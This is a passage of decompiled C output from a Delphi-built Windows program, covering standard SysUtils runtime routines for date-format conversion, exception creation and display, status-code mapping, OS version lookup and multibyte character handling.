  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = a3;
  v15 = a5;
  v14 = a4;
  v13 = (LStr *)&savedregs;
  v12[1] = (unsigned int)&loc_4091E6;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v7 = 1;
  System::__linkproc__ LStrClr(0);
  v8 = GetThreadLocale_0();
  Sysutils::GetLocaleStr((LCID)&dword_4091FC, 0x1009u, v8, (const int)&v20);
  if ( (unsigned int)(sub_407058(v20, 1, v9) - 3) < 3 )
  {
    while ( v7 <= sub_403724((int)a1) )
    {
      if ( _bittest(dword_41C104, (unsigned __int8)a1[v7 - 1]) )
      {
        __linkproc__ LStrCopy(a1, v7, 2, &v18);
        System::__linkproc__ LStrCat(a2, v18);
        v7 += 2;
      }
      else
      {
        if ( Sysutils::StrLIComp((const char *)2, (const char *)dword_409200, &a1[v7 - 1]) )
        {
          if ( Sysutils::StrLIComp((const char *)4, "yyyy", &a1[v7 - 1]) )
          {
            if ( Sysutils::StrLIComp((const char *)2, "yy", &a1[v7 - 1]) )
            {
              if ( a1[v7 - 1] == 89 || a1[v7 - 1] == 121 )
              {
                System::__linkproc__ LStrCat(a2, (char *)&dword_409240);
              }
              else
              {
                sub_403670(&v17);
                System::__linkproc__ LStrCat(a2, (char *)v17);
              }
            }
            else
            {
              System::__linkproc__ LStrCat(a2, (char *)dword_409234);
              ++v7;
            }
          }
          else
          {
            System::__linkproc__ LStrCat(a2, "eeee");
            v7 += 3;
          }
        }
        else
        {
          System::__linkproc__ LStrCat(a2, (char *)&dword_40920C);
          ++v7;
        }
        ++v7;
      }
    }
  }
  else if ( word_41E5AC == 4 || (unsigned __int16)(word_41E5AC - 17) < 2u )
  {
    while ( v7 <= sub_403724((int)a1) )
    {
      if ( a1[v7 - 1] != 71 && a1[v7 - 1] != 103 )
      {
        sub_403670(&v19);
        System::__linkproc__ LStrCat(a2, (char *)v19);
      }
      ++v7;
    }
  }
  else
  {
    __linkproc__ LStrAsg((char **)a2, a1);
  }
  v11 = v13;
  __writefsdword(0, v12[0]);
  v13 = (LStr *)&loc_4091ED;
  System::__linkproc__ LStrArrayClr(v11, 4);
}
// 409024: could not find valid save-restore pair for ebx
// 409024: could not find valid save-restore pair for edi
// 409024: could not find valid save-restore pair for esi
// 40906E: variable 'v9' is possibly undefined
// 4091FC: using guessed type int dword_4091FC;
// 409200: using guessed type int dword_409200[3];
// 40920C: using guessed type int dword_40920C;
// 409234: using guessed type int dword_409234[3];
// 409240: using guessed type int dword_409240;
// 41E5AC: using guessed type __int16 word_41E5AC;

//----- (00409244) --------------------------------------------------------
int __usercall sub_409244@<eax>(int result@<eax>)
{
  if ( result )
    result -= 4096;
  return result;
}

//----- (00409250) --------------------------------------------------------
unsigned int __userpurge Sysutils::ExceptionErrorMessage@<eax>(System::TObject *a1@<ecx>, LPCVOID lpAddress@<edx>, int a3@<eax>, char *a4, int a5)
{
  _BYTE *v7; // eax
  char *v8; // ebx
  int *v9; // edi
  unsigned int v10; // eax
  HINSTANCE v11; // eax
  int *v13; // [esp-Ch] [ebp-470h]
  int v14; // [esp+0h] [ebp-464h]
  char v15[256]; // [esp+Ch] [ebp-458h] BYREF
  char *v16; // [esp+10Ch] [ebp-358h] BYREF
  char v17; // [esp+110h] [ebp-354h]
  char *v18; // [esp+114h] [ebp-350h]
  char v19; // [esp+118h] [ebp-34Ch]
  int v20; // [esp+11Ch] [ebp-348h]
  char v21; // [esp+120h] [ebp-344h]
  char *v22; // [esp+124h] [ebp-340h]
  char v23; // [esp+128h] [ebp-33Ch]
  int *v24; // [esp+12Ch] [ebp-338h]
  char v25; // [esp+130h] [ebp-334h]
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+134h] [ebp-330h] BYREF
  CHAR v27[256]; // [esp+152h] [ebp-312h] BYREF
  CHAR Filename[261]; // [esp+252h] [ebp-212h] BYREF
  char v29[261]; // [esp+357h] [ebp-10Dh] BYREF
  int v30; // [esp+45Ch] [ebp-8h]
  unsigned __int8 *v31; // [esp+460h] [ebp-4h]

  v31 = (unsigned __int8 *)a1;
  VirtualQuery_0(lpAddress, &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 && GetModuleFileNameA_1((HMODULE)Buffer.AllocationBase, Filename, 0x105u) )
  {
    v30 = (_BYTE *)lpAddress - (_BYTE *)Buffer.AllocationBase;
  }
  else
  {
    GetModuleFileNameA_1(hInst, Filename, 0x105u);
    v30 = sub_409244((int)lpAddress);
  }
  v7 = Sysutils::AnsiStrRScan(92, (unsigned __int8 *)Filename);
  Sysutils::StrLCopy((char *)0x104, v7 + 1, v29);
  v8 = (char *)&dword_4093D0;
  v9 = &dword_4093D0;
  if ( sub_402C40((int *)a3, (int)dword_406240) )
  {
    v8 = sub_4038E8(*(char **)(a3 + 4));
    v10 = sub_407534(v8);
    if ( v10 )
    {
      if ( v8[v10 - 1] != 46 )
        v9 = &dword_4093D4;
    }
  }
  v13 = off_41DC78[0][1];
  v11 = (HINSTANCE)System::FindResourceHInstance((int)hInst);
  LoadStringA_0(v11, (UINT)v13, v27, 256);
  sub_402B5C(*(_DWORD *)a3, v15);
  v16 = v15;
  v17 = 4;
  v18 = v29;
  v19 = 6;
  v20 = v30;
  v21 = 5;
  v22 = v8;
  v23 = 6;
  v24 = v9;
  v25 = 6;
  Sysutils::StrLFmt((int)v27, (int)a4, v31, (char *)4, (int)&v16, v14);
  return sub_407534((const char *)v31);
}
// 4093B9: variable 'v14' is possibly undefined
// 406240: using guessed type int dword_406240[2];
// 4093D0: using guessed type int dword_4093D0;
// 4093D4: using guessed type int dword_4093D4;
// 41DC78: using guessed type int **off_41DC78[3];

//----- (004093D8) --------------------------------------------------------
int __usercall Sysutils::ShowException@<eax>(void *a1@<edx>, int a2@<eax>)
{
  _DWORD *v3; // eax
  int result; // eax
  HINSTANCE v5; // eax
  UINT v6; // [esp-Ch] [ebp-44Ch]
  int Buffer[16]; // [esp+0h] [ebp-440h] BYREF
  CHAR Text[1024]; // [esp+40h] [ebp-400h] BYREF

  Sysutils::ExceptionErrorMessage((System::TObject *)Text, a1, a2, (char *)0x400, Buffer[0]);
  if ( *off_41DC18 )
  {
    v3 = System::__linkproc__ Write0CString(off_41DB30, Text);
    result = sub_40520F(v3);
    sub_40265C();
  }
  else
  {
    v6 = off_41DB0C[0][1];
    v5 = (HINSTANCE)System::FindResourceHInstance((int)hInst);
    LoadStringA_0(v5, v6, (LPSTR)Buffer, 64);
    result = MessageBoxA_0(0, Text, (LPCSTR)Buffer, 0x2010u);
  }
  return result;
}
// 41DB0C: using guessed type int *off_41DB0C[9];
// 41DB30: using guessed type int (*off_41DB30)[115];
// 41DC18: using guessed type char *off_41DC18;

//----- (00409450) --------------------------------------------------------
void __usercall Exception_Create(void *Exception_Self@<eax>, void *string_Msg@<edx>)
{
  char *v2; // ecx
  char v3; // bl
  _DWORD *v4; // edi
  char v5; // [esp-10h] [ebp-1Ch]

  if ( (_BYTE)string_Msg )
    Exception_Self = (void *)System::__linkproc__ ClassCreate((int)Exception_Self, (char)string_Msg, v5);
  v3 = (char)string_Msg;
  v4 = Exception_Self;
  __linkproc__ LStrAsg((char **)Exception_Self + 1, v2);
  if ( v3 )
    sub_402D34(v4);
}
// 40945A: variable 'v5' is possibly undefined
// 409461: variable 'string_Msg' is possibly undefined
// 40946A: variable 'v2' is possibly undefined

//----- (0040948C) --------------------------------------------------------
void __usercall Exception_CreateFmt(void *Exception_Self@<eax>, void *string_Msg@<edx>, void *TVarRec_Args@<ecx>)
{
  char v3; // bl
  char **v4; // edi
  LStr *v5; // ecx
  unsigned int v6[2]; // [esp-28h] [ebp-2Ch] BYREF
  LStr *v7; // [esp-20h] [ebp-24h]
  char v8; // [esp-1Ch] [ebp-20h]
  BYTE *v9; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF
  int v11; // [esp+Ch] [ebp+8h]
  int v12; // [esp+10h] [ebp+Ch]

  v9 = 0;
  if ( (_BYTE)string_Msg )
    Exception_Self = (void *)System::__linkproc__ ClassCreate((int)Exception_Self, (char)string_Msg, v8);
  v3 = (char)string_Msg;
  v4 = (char **)Exception_Self;
  v7 = (LStr *)&savedregs;
  v6[1] = (unsigned int)&loc_4094E6;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_407B2C((unsigned __int8 *)TVarRec_Args, v12, v11, &v9);
  __linkproc__ LStrAsg(v4 + 1, (char *)v9);
  v5 = v7;
  __writefsdword(0, v6[0]);
  v7 = (LStr *)&loc_4094ED;
  System::__linkproc__ LStrClr(v5);
  if ( v3 )
    sub_402D34(v4);
}
// 4094A2: variable 'string_Msg' is possibly undefined
// 4094C0: variable 'TVarRec_Args' is possibly undefined
// 40948C: inconsistent function type and number of purged bytes

//----- (0040950C) --------------------------------------------------------
void __usercall Exception_CreateRes_0(void *Exception_Self@<eax>, void *PResStringRec_ResStringRec@<edx>)
{
  int v2; // ecx
  char v3; // bl
  _DWORD *v4; // edi
  char v5; // [esp-10h] [ebp-1Ch]

  if ( (_BYTE)PResStringRec_ResStringRec )
    Exception_Self = (void *)System::__linkproc__ ClassCreate((int)Exception_Self, (char)PResStringRec_ResStringRec, v5);
  v3 = (char)PResStringRec_ResStringRec;
  v4 = Exception_Self;
  System::LoadResString(v2, (BYTE **)Exception_Self + 1);
  if ( v3 )
    sub_402D34(v4);
}
// 409516: variable 'v5' is possibly undefined
// 40951D: variable 'PResStringRec_ResStringRec' is possibly undefined
// 409526: variable 'v2' is possibly undefined

//----- (00409548) --------------------------------------------------------
void __usercall Sysutils::Exception::Exception(void *Exception_Self@<eax>, void *NativeUInt_Ident@<edx>, void *TVarRec_Args@<ecx>)
{
  char v3; // bl
  char **v4; // edi
  LStr *v5; // ecx
  unsigned int v6[2]; // [esp-28h] [ebp-30h] BYREF
  LStr *v7; // [esp-20h] [ebp-28h]
  char v8; // [esp-1Ch] [ebp-24h]
  BYTE *v9; // [esp+0h] [ebp-8h] BYREF
  BYTE *v10; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF
  int v12; // [esp+10h] [ebp+8h]
  int v13; // [esp+14h] [ebp+Ch]

  v10 = 0;
  v9 = 0;
  if ( (_BYTE)NativeUInt_Ident )
    Exception_Self = (void *)System::__linkproc__ ClassCreate((int)Exception_Self, (char)NativeUInt_Ident, v8);
  v3 = (char)NativeUInt_Ident;
  v4 = (char **)Exception_Self;
  v7 = (LStr *)&savedregs;
  v6[1] = (unsigned int)&loc_4095B4;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  System::LoadResString((int)TVarRec_Args, &v9);
  sub_407B2C(v9, v13, v12, &v10);
  __linkproc__ LStrAsg(v4 + 1, (char *)v10);
  v5 = v7;
  __writefsdword(0, v6[0]);
  v7 = (LStr *)&loc_4095BB;
  System::__linkproc__ LStrArrayClr(v5, 2);
  if ( v3 )
    sub_402D34(v4);
}
// 409560: variable 'NativeUInt_Ident' is possibly undefined
// 40957B: variable 'TVarRec_Args' is possibly undefined
// 409548: inconsistent function type and number of purged bytes

//----- (004095DC) --------------------------------------------------------
int __usercall sub_4095DC@<eax>(int result@<eax>)
{
  if ( *(_BYTE *)(result + 12) )
    result = System::TObject::FreeInstance(result);
  return result;
}

//----- (00409608) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int SysUtils::_16709()
{
  int v0; // ebx
  int v1; // eax
  void *v2; // edx
  int v3; // esi
  int result; // eax

  v0 = 0;
  v1 = sub_402698();
  v3 = v1;
  while ( v0 <= 6 && v1 != dword_41C1F8[2 * v0] )
    ++v0;
  LOBYTE(v2) = 1;
  if ( v0 > 6 )
    Sysutils::Exception::Exception(dword_406360, v2, off_41DB08[0]);
  else
    Exception_Create(dword_406360, v2);
  *(_DWORD *)(result + 12) = v3;
  return result;
}
// 40963A: variable 'v2' is possibly undefined
// 40965E: variable 'result' is possibly undefined
// 406360: using guessed type int dword_406360[3];
// 41C1F8: using guessed type int dword_41C1F8[];
// 41DB08: using guessed type int *off_41DB08[10];

//----- (00409688) --------------------------------------------------------
void __userpurge SysUtils::_16713(int a1@<eax>, DWORD a2, DWORD a3, DWORD a4, const ULONG_PTR *a5)
{
  void *v5; // edx

  if ( a1 != 1 && a1 != 2 )
  {
    v5 = (void *)(a1 - 25);
    if ( (unsigned int)(a1 - 3) < 0x16 )
    {
      LOBYTE(v5) = 1;
      Exception_Create((void *)dword_41C218[2 * a1], v5);
    }
    else
    {
      SysUtils::_16709();
    }
  }
  sub_402F98(a2, a3, a4, a5);
}
// 41C218: using guessed type int dword_41C218[];
// 41E5F4: using guessed type int dword_41E5F4;
// 41E5F8: using guessed type int dword_41E5F8;

//----- (004096CC) --------------------------------------------------------
int __usercall SysUtils::_16714@<eax>(char *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  void *v5; // edx
  int v6; // eax
  int v7; // ebx
  LStr *v8; // ecx
  LStr *v9; // ecx
  unsigned int v11[2]; // [esp-Ch] [ebp-38h] BYREF
  LStr *v12; // [esp-4h] [ebp-30h]
  BYTE *v13[2]; // [esp+Ch] [ebp-20h] BYREF
  char v14; // [esp+14h] [ebp-18h]
  int v15; // [esp+18h] [ebp-14h]
  char v16; // [esp+1Ch] [ebp-10h]
  int v17; // [esp+20h] [ebp-Ch]
  char v18; // [esp+24h] [ebp-8h]
  BYTE *v19; // [esp+28h] [ebp-4h] BYREF
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v13[0] = 0;
  v19 = 0;
  v12 = (LStr *)&savedregs;
  v11[1] = (unsigned int)&loc_409768;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  if ( a1 )
    __linkproc__ LStrLAsg((char **)&v19, a1);
  else
    System::LoadResString((int)off_41DC0C[0], &v19);
  v13[1] = v19;
  v14 = 11;
  v15 = a2;
  v16 = 11;
  v17 = a3;
  v18 = 0;
  System::LoadResString((int)off_41DC40[0], v13);
  LOBYTE(v5) = 1;
  Exception_CreateFmt(dword_406A68, v5, v13[0]);
  v7 = v6;
  v8 = v12;
  __writefsdword(0, v11[0]);
  v12 = (LStr *)&loc_40976F;
  System::__linkproc__ LStrClr(v8);
  System::__linkproc__ LStrClr(v9);
  return v7;
}
// 409743: variable 'v5' is possibly undefined
// 409748: variable 'v6' is possibly undefined
// 409762: variable 'v9' is possibly undefined
// 406A68: using guessed type int dword_406A68[5];
// 41DC0C: using guessed type int **off_41DC0C[3];
// 41DC40: using guessed type int **off_41DC40[17];

//----- (00409778) --------------------------------------------------------
void __stdcall sub_409778(DWORD a1, DWORD a2, DWORD a3, const ULONG_PTR *a4)
{
  sub_402F98(a1, a2, a3, a4);
}

//----- (00409788) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_409788(char *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  DWORD v4; // [esp-10h] [ebp-10h]
  DWORD v5; // [esp-Ch] [ebp-Ch]
  DWORD v6; // [esp-8h] [ebp-8h]
  const ULONG_PTR *v7; // [esp-4h] [ebp-4h]

  SysUtils::_16714(a1, a2, a3);
  sub_409778(v4, v5, v6, v7);
}
// 40979F: positive sp value 10 has been found
// 409799: variable 'v4' is possibly undefined
// 409799: variable 'v5' is possibly undefined
// 409799: variable 'v6' is possibly undefined
// 409799: variable 'v7' is possibly undefined

//----- (004097A4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __fastcall SysUtils::_16717(int a1, void *a2)
{
  int result; // eax
  DWORD v3; // [esp-Ch] [ebp-14h]
  DWORD v4; // [esp-8h] [ebp-10h]
  const ULONG_PTR *v5; // [esp-4h] [ebp-Ch]

  LOBYTE(v3) = 11;
  LOBYTE(a2) = 1;
  Sysutils::Exception::Exception(dword_406AC8, a2, off_41DB20[0]);
  sub_402F98(0, v3, v4, v5);
  return result;
}
// 4097CD: positive sp value 10 has been found
// 4097C6: variable 'v3' is possibly undefined
// 4097C6: variable 'v4' is possibly undefined
// 4097C6: variable 'v5' is possibly undefined
// 406AC8: using guessed type int dword_406AC8[4];
// 41DB20: using guessed type int *off_41DB20[4];

//----- (004097D0) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
char __usercall SysUtils::_16718@<al>(int *a1@<eax>)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  unsigned int v4; // eax
  bool v5; // cf
  unsigned int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax

  v1 = *a1;
  if ( v1 > -1073741678 )
  {
    if ( v1 > -1073741674 )
    {
      v9 = v1 + 1073741571;
      if ( !v9 )
        return 14;
      if ( v9 == 61 )
        return 13;
    }
    else
    {
      if ( v1 == -1073741674 )
        return 12;
      v7 = v1 + 1073741677;
      if ( !v7 )
        return 9;
      v8 = v7 - 1;
      if ( !v8 )
        return 3;
      if ( v8 == 1 )
        return 5;
    }
  }
  else
  {
    if ( v1 == -1073741678 )
      return 6;
    if ( v1 <= -1073741682 )
    {
      if ( v1 == -1073741682 )
        return 7;
      v2 = v1 + 1073741819;
      if ( !v2 )
        return 11;
      v3 = v2 - 135;
      if ( !v3 )
        return 4;
      if ( v3 != 1 )
        return 22;
      return 9;
    }
    v4 = v1 + 1073741681;
    v5 = v4 < 2;
    v6 = v4 - 2;
    if ( v5 )
      return 6;
    if ( !v6 )
      return 8;
  }
  return 22;
}

//----- (00409850) --------------------------------------------------------
int __usercall sub_409850@<eax>(int *a1@<eax>)
{
  return dword_41C218[2 * (unsigned __int8)SysUtils::_16718(a1)];
}
// 41C218: using guessed type int dword_41C218[];

//----- (00409864) --------------------------------------------------------
int __cdecl SysUtils::_16720(int a1)
{
  int v1; // ebx
  int v2; // esi
  void *v3; // edx
  int v4; // eax
  int v5; // ebx
  void *v6; // edx
  int v7; // eax
  LStr *v8; // ecx
  LStr *v9; // ecx
  LStr *v10; // ecx
  unsigned int v12[2]; // [esp-Ch] [ebp-184h] BYREF
  LStr *v13; // [esp-4h] [ebp-17Ch]
  BYTE *v14[2]; // [esp+8h] [ebp-170h] BYREF
  char v15; // [esp+10h] [ebp-168h]
  BYTE *v16; // [esp+14h] [ebp-164h]
  char v17; // [esp+18h] [ebp-160h]
  int v18; // [esp+1Ch] [ebp-15Ch]
  char v19; // [esp+20h] [ebp-158h]
  BYTE *v20; // [esp+24h] [ebp-154h] BYREF
  BYTE *v21; // [esp+28h] [ebp-150h] BYREF
  char *v22[2]; // [esp+2Ch] [ebp-14Ch] BYREF
  char v23; // [esp+34h] [ebp-144h]
  char *v24; // [esp+38h] [ebp-140h]
  char v25; // [esp+3Ch] [ebp-13Ch]
  BYTE *v26; // [esp+40h] [ebp-138h]
  char v27; // [esp+44h] [ebp-134h]
  int v28; // [esp+48h] [ebp-130h]
  char v29; // [esp+4Ch] [ebp-12Ch]
  CHAR Filename[261]; // [esp+53h] [ebp-125h] BYREF
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+158h] [ebp-20h] BYREF
  BYTE *v32; // [esp+174h] [ebp-4h] BYREF
  int savedregs; // [esp+178h] [ebp+0h] BYREF

  v14[0] = 0;
  v22[0] = 0;
  v20 = 0;
  v21 = 0;
  v32 = 0;
  v13 = (LStr *)&savedregs;
  v12[1] = (unsigned int)&loc_409A1F;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v1 = *(_DWORD *)(a1 - 4);
  if ( *(_DWORD *)(v1 + 20) )
    System::LoadResString((int)off_41DBF8, &v32);
  else
    System::LoadResString((int)off_41DC88[0], &v32);
  v2 = *(_DWORD *)(v1 + 24);
  VirtualQuery_0(*(LPCVOID *)(v1 + 12), &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 && GetModuleFileNameA_1((HMODULE)Buffer.AllocationBase, Filename, 0x105u) )
  {
    v22[1] = *(char **)(v1 + 12);
    v23 = 5;
    sub_4036F8(&v21, (BYTE *)Filename, 261);
    Sysutils::ExtractFileName((char *)v21, v22);
    v24 = v22[0];
    v25 = 11;
    v26 = v32;
    v27 = 11;
    v28 = v2;
    v29 = 5;
    System::LoadResString((int)off_41DC28[0], &v20);
    LOBYTE(v3) = 1;
    Exception_CreateFmt(dword_4068A0, v3, v20);
    v5 = v4;
  }
  else
  {
    v14[1] = *(BYTE **)(v1 + 12);
    v15 = 5;
    v16 = v32;
    v17 = 11;
    v18 = v2;
    v19 = 5;
    System::LoadResString((int)off_41DC50[0], v14);
    LOBYTE(v6) = 1;
    Exception_CreateFmt(dword_4068A0, v6, v14[0]);
    v5 = v7;
  }
  v8 = v13;
  __writefsdword(0, v12[0]);
  v13 = (LStr *)&loc_409A26;
  System::__linkproc__ LStrClr(v8);
  System::__linkproc__ LStrArrayClr(v9, 3);
  System::__linkproc__ LStrClr(v10);
  return v5;
}
// 40998B: variable 'v3' is possibly undefined
// 409990: variable 'v4' is possibly undefined
// 4099E7: variable 'v6' is possibly undefined
// 4099EC: variable 'v7' is possibly undefined
// 409A11: variable 'v9' is possibly undefined
// 409A19: variable 'v10' is possibly undefined
// 4068A0: using guessed type int dword_4068A0[5];
// 41DBF8: using guessed type int **off_41DBF8;
// 41DC28: using guessed type int **off_41DC28[2];
// 41DC50: using guessed type int **off_41DC50[13];
// 41DC88: using guessed type int **off_41DC88[3];

//----- (00409A30) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int *__usercall SysUtils::_16706@<eax>(int *a1@<eax>)
{
  int v1; // eax
  void *v2; // edx
  int *v3; // eax
  int *v4; // ebx
  void *v5; // edx
  int *v6; // eax
  LStr *v7; // ecx
  unsigned int v9[2]; // [esp-Ch] [ebp-20h] BYREF
  LStr *v10; // [esp-4h] [ebp-18h]
  BYTE *v11[2]; // [esp+4h] [ebp-10h] BYREF
  char v12; // [esp+Ch] [ebp-8h]
  BYTE **v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v11[0] = 0;
  v13 = (BYTE **)a1;
  v10 = (LStr *)&savedregs;
  v9[1] = (unsigned int)&loc_409AEB;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v1 = (unsigned __int8)SysUtils::_16718(a1);
  v2 = (void *)(v1 - 11);
  if ( (unsigned int)(v1 - 3) < 8 )
    goto LABEL_4;
  if ( v1 == 11 )
  {
    v4 = (int *)SysUtils::_16720((int)&savedregs);
  }
  else
  {
    v2 = (void *)(v1 - 22);
    if ( (unsigned int)(v1 - 12) < 0xA )
    {
LABEL_4:
      LOBYTE(v2) = 1;
      Exception_Create((void *)dword_41C218[2 * v1], v2);
      v4 = v3;
      goto LABEL_7;
    }
    v11[1] = *v13;
    v12 = 0;
    System::LoadResString((int)off_41DAD8[0], v11);
    LOBYTE(v5) = 1;
    Exception_CreateFmt(dword_406410, v5, v11[0]);
    v4 = v6;
  }
LABEL_7:
  if ( sub_402C40(v4, (int)dword_4063B8) )
    v4[3] = (int)v13;
  v7 = v10;
  __writefsdword(0, v9[0]);
  v10 = (LStr *)&loc_409AF2;
  System::__linkproc__ LStrClr(v7);
  return v4;
}
// 409A7F: variable 'v3' is possibly undefined
// 409AB7: variable 'v5' is possibly undefined
// 409ABC: variable 'v6' is possibly undefined
// 4063B8: using guessed type int dword_4063B8[3];
// 406410: using guessed type int dword_406410[5];
// 41C218: using guessed type int dword_41C218[];
// 41DAD8: using guessed type int **off_41DAD8[2];

//----- (00409AFC) --------------------------------------------------------
void __usercall __noreturn sub_409AFC(int a1@<eax>, void *a2@<edx>)
{
  Sysutils::ShowException(a2, a1);
  sub_4034B0(1);
}

//----- (00409B0C) --------------------------------------------------------
void SysUtils::_16723()
{
  void *v0; // edx
  int v1; // eax
  void *v2; // edx
  int v3; // eax
  LStr *v4; // ecx
  unsigned int v5[2]; // [esp-Ch] [ebp-14h] BYREF
  LStr *v6; // [esp-4h] [ebp-Ch]
  BYTE *v7; // [esp+0h] [ebp-8h] BYREF
  BYTE *v8; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = 0;
  v7 = 0;
  v6 = (LStr *)&savedregs;
  v5[1] = (unsigned int)&loc_409BCD;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  System::LoadResString((int)off_41DB10[0], &v8);
  LOBYTE(v0) = 1;
  Exception_Create(dword_406304, v0);
  dword_41E5F4 = v1;
  System::LoadResString((int)off_41DBDC[0], &v7);
  LOBYTE(v2) = 1;
  Exception_Create(dword_40678C, v2);
  dword_41E5F8 = v3;
  *off_41DAE0 = (int)SysUtils::_16713;
  *off_41DB54[0] = (int)sub_409AFC;
  *(_DWORD *)off_41DB04 = dword_406240;
  *(_DWORD *)off_41DB48 = sub_409850;
  *off_41DB58 = (int)SysUtils::_16706;
  *(_DWORD *)off_41DBF0 = sub_409788;
  *off_41DAD4 = (int)SysUtils::_16717;
  v4 = v6;
  __writefsdword(0, v5[0]);
  v6 = (LStr *)&loc_409BD4;
  System::__linkproc__ LStrArrayClr(v4, 2);
}
// 409B38: variable 'v0' is possibly undefined
// 409B3D: variable 'v1' is possibly undefined
// 409B59: variable 'v2' is possibly undefined
// 409B5E: variable 'v3' is possibly undefined
// 406240: using guessed type int dword_406240[2];
// 406304: using guessed type int dword_406304[4];
// 40678C: using guessed type int dword_40678C[4];
// 41DAD4: using guessed type int *off_41DAD4;
// 41DAE0: using guessed type int *off_41DAE0;
// 41DB04: using guessed type void *off_41DB04;
// 41DB10: using guessed type int *off_41DB10[8];
// 41DB48: using guessed type void *off_41DB48;
// 41DB54: using guessed type int *off_41DB54[2];
// 41DB58: using guessed type int *off_41DB58;
// 41DBDC: using guessed type int **off_41DBDC[5];
// 41DBF0: using guessed type void *off_41DBF0;
// 41E5F4: using guessed type int dword_41E5F4;
// 41E5F8: using guessed type int dword_41E5F8;

//----- (00409BD8) --------------------------------------------------------
// Borland Visual Component Library & Packages
void *SysUtils::_16801()
{
  void *result; // eax

  *(_BYTE *)(dword_41E5F4 + 12) = 1;
  (*(void (**)(void))(*(_DWORD *)dword_41E5F4 - 8))();
  dword_41E5F4 = 0;
  *(_BYTE *)(dword_41E5F8 + 12) = 1;
  sub_402BDC((_DWORD *)dword_41E5F8);
  dword_41E5F8 = 0;
  *off_41DAE0 = 0;
  *off_41DB54[0] = 0;
  *(_DWORD *)off_41DB04 = 0;
  *(_DWORD *)off_41DB48 = 0;
  *off_41DB58 = 0;
  result = off_41DBF0;
  *(_DWORD *)off_41DBF0 = 0;
  return result;
}
// 41DAE0: using guessed type int *off_41DAE0;
// 41DB04: using guessed type void *off_41DB04;
// 41DB48: using guessed type void *off_41DB48;
// 41DB54: using guessed type int *off_41DB54[2];
// 41DB58: using guessed type int *off_41DB58;
// 41DBF0: using guessed type void *off_41DBF0;
// 41E5F4: using guessed type int dword_41E5F4;
// 41E5F8: using guessed type int dword_41E5F8;

//----- (00409C44) --------------------------------------------------------
void SysUtils::_16802()
{
  struct _OSVERSIONINFOA v0; // [esp+0h] [ebp-94h] BYREF

  v0.dwOSVersionInfoSize = 148;
  if ( GetVersionExA(&v0) )
  {
    dword_41C0C0 = v0.dwPlatformId;
    dword_41C0C4 = v0.dwMajorVersion;
    dword_41C0C8 = v0.dwMinorVersion;
    dword_41C0CC = v0.dwBuildNumber;
    sub_4036F8(&dword_41C0D0, (BYTE *)v0.szCSDVersion, 128);
  }
}
// 41C0C0: using guessed type int dword_41C0C0;
// 41C0C4: using guessed type int dword_41C0C4;
// 41C0C8: using guessed type int dword_41C0C8;
// 41C0CC: using guessed type int dword_41C0CC;

//----- (00409C9C) --------------------------------------------------------
int __usercall SysUtils::_16727@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>)
{
  int v3; // edx
  int i; // esi

  v3 = 0;
  if ( a1 && a1[a2] )
  {
    if ( a2 )
    {
      for ( i = a2 - 1; i >= 0 && _bittest(dword_41C104, a1[i]); --i )
        ;
      if ( (a2 - i) % 2 )
      {
        if ( _bittest(dword_41C104, a1[a2]) )
          LOBYTE(v3) = 1;
      }
      else
      {
        LOBYTE(v3) = 2;
      }
    }
    else if ( _bittest(dword_41C104, *a1) )
    {
      LOBYTE(v3) = 1;
    }
  }
  return v3;
}

//----- (00409D14) --------------------------------------------------------
int __usercall Sysutils::ByteType@<eax>(int a1@<edx>, char *a2@<eax>)
{
  int result; // eax
  unsigned __int8 *v5; // eax

  result = 0;
  if ( LOBYTE(dword_41E5B0[0]) )
  {
    v5 = (unsigned __int8 *)sub_4038E8(a2);
    result = SysUtils::_16727(v5, a1 - 1);
  }
  return result;
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00409D38) --------------------------------------------------------
int __usercall sub_409D38@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>)
{
  int v2; // ecx

  v2 = 0;
  if ( LOBYTE(dword_41E5B0[0]) )
    v2 = SysUtils::_16727(a1, a2);
  return v2;
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00409D50) --------------------------------------------------------
int __usercall Sysutils::ByteToCharLen@<eax>(int a1@<edx>, int a2@<eax>)
{
  int v3; // esi

  v3 = a1;
  if ( a1 > sub_403724(a2) )
    v3 = sub_403724(a2);
  return sub_409D78(a2, v3);
}

